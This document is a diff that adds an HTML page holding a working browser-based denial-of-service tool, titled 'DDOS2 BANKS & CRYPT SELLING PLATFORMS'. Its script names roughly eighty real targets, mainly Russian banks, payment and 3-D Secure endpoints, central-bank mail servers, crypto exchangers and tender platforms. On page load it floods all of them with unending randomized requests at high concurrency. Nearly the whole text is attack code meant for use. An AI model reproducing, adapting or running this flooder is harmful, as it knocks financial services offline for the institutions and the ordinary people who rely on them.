@@ -1,0 +1,149 @@
+<head>
+    <title>DDOS2 BANKS & CRYPT SELLING PLATFORMS</title>
+</head>
+
+<body>
+
+<h3>Here is the stats of your session (the links and the number of the requests that were sent from
+    your browser):</h3>
+<div id="stats"></div>
+<div id="errors"></div>
+<p>If you missed it, <a href="https://www.bbc.com/news/world-europe-60503037">BBC NEWS: Ukraine
+    conflict: Russian forces attack from three sides</a></p>
+</body>
+<script>
+var targets = {
+"https://api.sberbank.ru/prod/tokens/v2/oauth" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://api.sberbank.ru/prod/tokens/v2/oidc" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://sberbank.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://res.online.sberbank.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://test.stat.online.sberbank.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://omega.sbrf.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://vito.sbrf.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://api.spasibosb.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://sbermegamarket.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://info.spasibosb.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://stories-stat.online.sberbank.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://scr.online.sberbank.ru/api/fl/idgib-w-3ds" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://3dsec.sberbank.ru/mportal3/auth/login" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://acs1.sbrf.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://acs2.sbrf.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://acs3.sbrf.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://acs4.sbrf.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://acs5.sbrf.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://acs6.sbrf.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://acs7.sbrf.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://acs8.sbrf.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://content.sberdevices.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://catalog.prom.app.sberdevices.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://cdn.sberdevices.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.tinkoff.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.raiffeisen.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://sovcombank.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.uralsib.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://skbbank.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.bspb.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.rosbank.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://rencredit.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.homecredit.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.atb.su/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.unicreditbank.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://mosoblbank.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://centrinvest.com/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://smpbank.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.gazprombank.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.vtb.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://mx4.cbr.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://mx3.cbr.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://email11.sberbank.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://email12.sberbank.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"http://tatsotsbank.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+
+//CRYPTO COMES HERE
+"https://cleanbtc.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://bonkypay.com/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://changer.club/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://superchange.net" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://mine.exchange/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://platov.co" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://ww-pay.net/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://delets.cash/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://betatransfer.org" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://ramon.money/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://coinpaymaster.com/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://bitokk.biz/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.netex24.net" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://cashbank.pro/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://flashobmen.com/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://abcobmen.com/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://ychanger.net/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://multichange.net/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://24paybank.ne" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://royal.cash/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://prostocash.com/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://baksman.org/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://kupibit.me/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://abcobmen.com" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.bestchange.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.moex.com/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://sbrf.com.ua/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.bestchange.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.finam.ru/" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://sberbank-ast.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://etp.roseltorg.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://zakazrf.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://etp-ets.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://rts-tender.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://gz.lot-online.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://tektorg.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://etpgpb.ru" : { number_of_requests: 0, number_of_errored_responses: 0 },
+"https://www.polymetalinternational.com" : { number_of_requests: 0, number_of_errored_responses: 0 },
+}
+var statsEl = document.getElementById('stats');
+function printStats() {
+statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
+}
+setInterval(printStats, 1000);
+var CONCURRENCY_LIMIT = 1000
+var queue = []
+async function fetchWithTimeout(resource, options) {
+const controller = new AbortController();
+const id = setTimeout(() => controller.abort(), options.timeout);
+return fetch(resource, {
+method: 'GET',
+mode: 'no-cors',
+signal: controller.signal
+}).then((response) => {
+clearTimeout(id);
+return response;
+}).catch((error) => {
+clearTimeout(id);
+throw error;
+});
+}
+async function flood(target) {
+for (var i = 0;; ++i) {
+if (queue.length > CONCURRENCY_LIMIT) {
+await queue.shift()
+}
+rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
+queue.push(
+fetchWithTimeout(target+rand, { timeout: 1000 })
+.catch((error) => {
+if (error.code === 20 /* ABORT */) {
+return;
+}
+targets[target].number_of_errored_responses++;
+})
+.then((response) => {
+if (response && !response.ok) {
+targets[target].number_of_errored_responses++;
+}
+targets[target].number_of_requests++;
+})
+)
+}
+}
+
+Object.keys(targets).map(flood)
+</script>
